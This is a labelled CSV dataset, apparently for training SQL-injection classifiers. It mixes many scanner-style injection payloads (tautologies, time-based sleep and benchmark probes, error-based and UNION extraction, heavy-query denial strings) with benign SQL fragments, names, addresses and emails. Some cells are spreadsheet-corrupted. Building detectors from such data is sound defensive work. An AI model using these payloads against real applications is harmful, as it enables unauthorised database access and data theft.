Query,Label
1' or '1'  =  '1,1
SELECT * FROM word WHERE is BETWEEN education09/01/1996elephant AND twelve15/31/1996cut,0
"1'  )   or elt  (  5873  =  5873,sleep  (  5   )    )   #",1
"1,updatexml  (  2917,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  2917  =  2917,1   )    )     )  ,0x717a767a71  )  ,8295  )  ",1
"1""  )   as wvxt where 7321  =  7321 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",1
1'+  (  select 'mdiu' where 4443  =  4443,1
"iif  (  6307  =  2459,1,1/0  )  ",1
orieta,0
"c/ berruguete 23,",0
"iif  (  9342  =  6508,1,1/0  )  ",1
" SELECT column_name ( s )  FROM stretch,fall",0
"1'   )    )     )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  'ibrj'  =  'ibrj",1
salavedra castelltort,0
SELECT * FROM ear WHERE through NOT LIKE 'sky%',0
1'||  (  select 'homm' where 4937  =  4937 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,1
121,0
SELECT * FROM ordinary 3,0
SELECT * FROM given WHERE though = 'breathe',0
"   SELECT flow, stop+ ', ' + oxygen+ ' ' + temperature+ ', ' + trunk AS rise  FROM gulf",0
-3424'   )    )    or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (   'dyuo'  =  'dyuo,1
"1',iif  (  4861  =  6268,1,1/0  )  ",1
SELECT plane FROM equipment UNION ALL SELECT but FROM contrast ORDER BY birds,0
98810075m,0
rushmann@clubforex.jm,0
ab_ogadora,0
SELECT * FROM upward WHERE pale = 'structure' FETCH FIRST 3 ROWS ONLY,0
"1""   )    )     )   or elt  (  5873  =  5873,sleep  (  5   )    )   #",1
ballou@adondeir.mn,0
"1""   )    )    as paep where 8947  =  8947 and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",1
" SELECT * FROM serious ORDER BY wrote ASC, spin DESC",0
moua,0
1'  )   where 4298  =  4298,1
SELECT * FROM largest WHERE union NOT LIKE '[function]%',0
"1'  )   and elt  (  5245  =  9203,9203  )   and   (  'fhlw' like 'fhlw",1
1   )    )    as vcvn where 2106  =  2106,1
#NAME?,1
SELECT AVG ( window )  FROM simply  SELECT SUM ( thick ) ,0
SELECT find ( s ) FROM produce INNER JOIN,0
SELECT * FROM writing FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM according,0
"  SELECT coffee,band FROM tonight WHERE willing = 'sale' UNION SELECT merely, carbon FROM extra",0
SELECT * FROM group WHERE figure = 'vapor' LIMIT 3,0
FROM  ( SELECT DISTINCT ice FROM topic ) ,0
1'   )    )     )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and    (    (     (  'lajk'  =  'lajk,1
"  SELECT canal,nose FROM empty WHERE plastic = 'eleven' UNION SELECT steep, cattle FROM heart",0
SELECT * FROM  ( SELECT station FROM flew ) ,0
"-1908""  )   where 6420  =  6420 union all select 6420,6420,6420,6420--",1
1'   )    )     )   and   (  3020  =  3020  )  *6703 and    (    (     (  'ujds'  =  'ujds,1
" select * from users where id  =  1 union select 1<@$,version  (    )   -- 1",1
warwicke@discon.mm,0
hirn,0
"1'   )    )     )   or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (     (  'crus'  =  'crus",1
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 28638 )  ORDER BY meta_id ASC",0
3.64462E+15,0
homan,0
FROM  ( SELECT DISTINCT lion FROM asleep ) ,0
"-1171' union all select 3958,3958,3958,3958,3958--",1
ridgeley_fechner@beesmer.ye,0
"1' or elt  (  6272  =  6272,sleep  (  5   )    )    and 'vrim'  =  'vrim",1
"1'   )    )    and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and    (    (   'vwtq'  =  'vwtq",1
muiz,0
"1%""   )    )    and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (   ""%""  =  """,1
"-8128""   )    )    as ovjz where 7375  =  7375 union all select 7375,7375,7375,7375,7375,7375,7375,7375,7375--",1
SELECT AVG ( weigh ) FROM pay,0
"1',  (  select   (  case when   (  7734  =  7734  )   then   (  select benchmark  (  5000000,md5  (  0x72747341   )    )     )   else 7734*  (  select 7734 from mysql.db  )   end   )    )   ",1
milionario.kirkham@programa-gestion-erp.mil,0
9.4488E+15,0
1' where 4403  =  4403 rlike sleep  (  5  )  #,1
"1'   )    )    or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1
"1%""   )    )     )   or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and    (    (     (  ""%""  =  """,1
"1'   )    )     )   or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1
"-9163"" union all select 3820,3820,3820,3820,3820,3820,3820,3820,3820#",1
SELECT * FROM symbol WHERE perfect = 'fellow' LIMIT 3,0
"1'  )    (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )  ",1
SELECT * FROM giving WHERE car NOT LIKE '[ran]%',0
"1   )    )     )   or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (     (  3504  =  3504",1
remax ondetti,0
SELECT * FROM luck FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM daughter,0
3702,0
1'||  (  select 'aevx' from dual where 9999  =  9999,1
"  UPDATE essential SET hour =  'must', City =  'attempt' WHERE hidden =  border",0
-9975 where 9760  =  9760 order by 1--,1
SELECT * FROM standard FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM seeing,0
SELECT * FROM bad WHERE baby BETWEEN row09/01/1996moving AND mood15/31/1996development,0
SELECT TOP 3 * FROM pair WHERE five = 'avoid' SELECT * FROM chose,0
SELECT * FROM sky WHERE light BETWEEN '1996-07-01' AND '1996-07-31',0
decio,0
"1 and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1
"c/ relfas 122,",0
"-3219""  )   order by 1--",1
SELECT AVG ( stream ) FROM reader SELECT SUM ( drink ) ,0
-6190'   )    )     )   union all select 9413--,1
"-9725'  )   union all select 2481,2481,2481,2481,2481,2481,2481,2481,2481,2481--",1
SELECT * FROM itself WHERE century BETWEEN dirty09/01/1996more AND load15/31/1996case,0
SELECT AVG ( Price ) FROM potatoes,0
jagdish,0
hammong4@asyra.st,0
"-5207  )   where 6987  =  6987 or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",1
SELECT * FROM while WHERE dream  BETWEEN 10 AND 20,0
7.92638E+15,0
SELECT * FROM problem WHERE movie = 'add' LIMIT 3,0
SELECT police ( s )  FROM luck SELECT not FROM exist,0
"1  )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )  ",1
"  SELECT circleID AS ID, stove AS headed FROM thing",0
"calle romeral, 143, 7?h",0
SELECT * FROM piece WHERE raw = 'wide'  AND  ( brass = 'hat' OR newspaper = 'understanding' ) ,0
SELECT TOP 3 * FROM structure WHERE oldest = 'needs',0
8.04302E+15,0
"1'   )    )    or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (   'skdm'  =  'skdm",1
emetrio,0
"  SELECT BINARY ""W3Schools.com"";",0
SELECT * FROM individual WHERE blind BETWEEN '1996-07-01' AND '1996-07-31',0
"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and    (    (   ""uidb"" like ""uidb",1
hi' or 'a'  =  'a,1
64sfa4imiento,0
"-1985%'   )    )     )   union all select 3051,3051,3051--",1
1'   )    )    and 7533  =  7533 and    (    (   'pagc' like 'pagc,1
SELECT MIN ( stream )  AS dance FROM three,0
SELECT TOP 3 * FROM coach WHERE strike = 'split' SELECT * FROM fellow,0
"1""   )    )    or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (   ""chvi"" like ""chvi",1
SELECT * FROM agree WHERE    NOT labor = 'action',0
torrescrcela,0
"-3501'   )    )     )   or make_set  (  7122  =  6158,6158  )   and    (    (     (  'mlfl' like 'mlfl",1
SELECT AVG ( chemical ) FROM ants,0
select * from users where id  =  1   or 1  =  1 -- 1,1
"SELECT CONCAT ( ""SQL "", ""Tutorial "", ""is "", ""fun!"" )  AS ConcatenatedString;",0
SELECT AVG ( test ) FROM look SELECT SUM ( free ) ,0
SELECT * FROM clock WHERE porch = 'character',0
00505336a,0
"   SELECT identity, applied, laidFROM strip WHERE mathematics  IS NOT NULL",0
SELECT * FROM had 3 SELECT * FROM growth,0
SELECT * FROM vast WHERE slide = 'known' LIMIT 3,0
1   )    )    as xlww where 5844  =  5844,1
SELECT * FROM film WHERE Price NOT BETWEEN 10 AND 20,0
"INSERT INTO whispered  ( create, section, alone )  VALUES  ( 'find', 'seat', 'mainly' )  ",0
"  SELECT were,during,said FROM word LEFT JOIN Orders ON science.noneID =  star.rich ORDER BY congress.part",0
rosngela,0
" select * from users where id  =  '1' or \.<1 union select 1,@@VERSION -- 1'",1
"-1653 union all select 8415,8415,8415,8415,8415,8415,8415,8415#",1
doce de novembro 165,0
SELECT * FROM sing WHERE shot = 'build',0
"1 where 3799  =  3799 and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",1
"-2643%"" union all select 7779,7779--",1
FROM  ( SELECT DISTINCT soldier FROM mail ) ,0
pankiw,0
valdepolo,0
SELECT TOP 3 * FROM major SELECT * FROM water 3SELECT * FROM card,0
15873,0
"1%""   )    )    and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   -- ygbf",1
50174,0
1   )    )    as rvex where 3462  =  3462 and 4595  =  4595#,1
"1' and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   ",1
"  SELECT famousID AS ID, principle AS room FROM children",0
SELECT * FROM guide WHERE group = 'most' LIMIT 3,0
"  UPDATE which SET gas =  'court', City =  'its' WHERE dropped =  can",0
 UPDATE deeply SET dance = 'trace'WHERE truth = 'bar',0
SELECT wp_posts.* FROM wp_posts WHERE ID IN  ( 367581 ) ,0
"1'+  (  select ounb where 4653  =  4653 or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )     )  +'",1
oblong0,0
"1,  (  select   (  case when   (  5777  =  5777  )   then 1 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual  )  ",1
"-2959"" union all select 3414,3414,3414,3414,3414,3414,3414,3414#",1
 UPDATE riding SET piano = 'perfectly'WHERE peace = 'such',0
a' or 'a'   =   'a,1
49439340n,0
SELECT TOP 3 * FROM weather,0
1' where 2547  =  2547 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   --,1
"1"" and 7533  =  7533 and ""dqjp""  =  ""dqjp",1
"-5640""   )    )    or 9792  =  2728--",1
SELECT tr.object_id FROM wp_term_relationships AS tr INNER JOIN wp_term_taxonomy AS tt ON tr.term_taxonomy_id  =  tt.term_taxonomy_id WHERE tt.taxonomy IN  ( 'nav_menu' )  AND tt.term_id IN  ( '716' )  ORDER BY tr.object_id ASC,0
"c/ torre, 23",0
ag-uzadura,0
"-3082""  )   where 1082  =  1082 or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",1
SELECT * FROM bread WHERE easier = 'affect'  AND City = 'foot',0
SELECT COUNT ( grabbed )  FROM highway,0
"-2230%"" union all select 3303,3303,3303--",1
portomarn,0
SELECT why ( s ) FROM cow INNER JOIN,0
"1%'   )    )     )   or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",1
928,0
"1'   )    )    and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and    (    (   'vedm'  =  'vedm",1
balitear,0
"  SELECT share,direct,what FROM without LEFT JOIN Orders ON appropriate.greatestID =  you.creature ORDER BY raise.mission",0
-8004%'  )   or   (  2301  =  7504  )  *7504 and   (  '%'  =  ',1
SELECT get ( s )  FROM smoke UNION,0
SELECT MIN ( while )  AS excited FROM whole,0
SELECT * FROM soil FETCH FIRST 3 ROWS ONLY,0
4e6qu5r5r,0
DELETE FROM construction,0
"1""  )   union all select null,null,null,null,null,null,null,null,null,null--",1
SELECT * FROM excitement FETCH FIRST 50 PERCENT ROWS ONLY,0
"1'  )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  'ejnt' like 'ejnt",1
"   SELECT COUNT ( pond ) , sale FROM mission BY atmosphere",0
"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and 'xemh'  =  'xemh",1
condensativo,0
winstanley@waterflyesp.hn,0
"1' or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  ",1
38249138t,0
1' in boolean mode  )   or sleep  (  5  )  #,1
o.toole,0
SELECT AVG ( broad ) FROM trouble,0
"-7236 or make_set  (  9618  =  6919,6919  )  ",1
40592671v,0
sosao,0
"1'+  (  select 'ycsv' where 3628  =  3628 and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1
"1',  (  select   (  case when   (  2073  =  5314  )   then 1 else 1/  (  select 0  )   end   )    )   ",1
"INSERT INTO death ( guide, hit, without, pleasure, table, found )  VALUES  ( 'move', 'bite'. tree', 'brass', 'led', 'corner', 'substance' )  ",0
"-5572""  )   union all select 8131,8131#",1
SELECT * FROM born 3,0
19294,0
3.94593E+15,0
"calle santa pola, 7",0
SELECT * FROM forest FETCH FIRST 50 PERCENT ROWS ONLY,0
SELECT option_value FROM wp_options WHERE option_name  =  '_houzez_property_label_2691' LIMIT 1,0
"  SELECT degree,forward,train FROM health LEFT JOIN Orders ON string.colorID =  pole.difficult ORDER BY dog.farm",0
4210,0
"1  )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   ",1
"1'||  (  select 'ssvp' where 3300  =  3300 or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
select   (  case when   (  1272  =  5883  )   then 1272 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,1
29807509s,0
"  SELECT ship,thread FROM different WHERE himself = 'remove' UNION SELECT was, circus FROM alike",0
select   (  case when   (  4636  =  1108  )   then 1 else 4636*  (  select 4636 from master..sysdatabases  )   end  )  --,1
SELECT bigger ( s )  FROM mighty UNION ALL,0
26329,0
SELECT scientific ( s )  FROM term UNION ALL,0
-2495   )    )    as hudw where 4197  =  4197 or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --,1
SELECT * FROM  ( SELECT needle FROM root ) ,0
SELECT * FROM progress WHERE instrument = 'crack'  AND  ( freedom = 'something' OR pass = 'am' ) ,0
reiko,0
"1   )    )    union all select null,null,null,null,null,null,null,null#",1
SELECT * FROM reader WHERE busy = 'expect' FETCH FIRST 3 ROWS ONLY,0
ponferrada 65 10-c,0
SELECT roof ( s ) FROM diameter INNER JOIN,0
"1""  )   where 3084  =  3084 union all select null,null--",1
SELECT * FROM positive WHERE shinning IN  ( SELECT position FROM bill ) ,0
"1   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )  -- huss",1
" SELECT LEFT ( CustomerName, 5 )  AS ExtractString FROM Customers;",0
sanet y negrals,0
SELECT * FROM origin WHERE sudden = 'least'  OR least = 'solid',0
SELECT * FROM wp_posts WHERE ID  =  55211 LIMIT 1,0
SELECT AVG ( toward ) FROM bow,0
"1""   )    )    as chal where 6661  =  6661",1
"c/ antonia lancha, 38, 1?h",0
santaniello_tabernero@enfuerteventura.com.ni,0
73107657h,0
-9534%' or 3038  =  3038,1
"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )     )  +'",1
SELECT AVG ( immediately )  FROM basic  SELECT SUM ( her ) ,0
"1""   )    )     )   and 4967  =  8866 and    (    (     (  ""jzyn"" like ""jzyn",1
"1' and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and 'wytg'  =  'wytg",1
iraola rudi,0
5123,0
campanini-adamson@barebackspain.kh,0
piero,0
 )   union select * from information_schema.tables;,1
"-6639'  )   as trll where 6271  =  6271 union all select 6271,6271,6271#",1
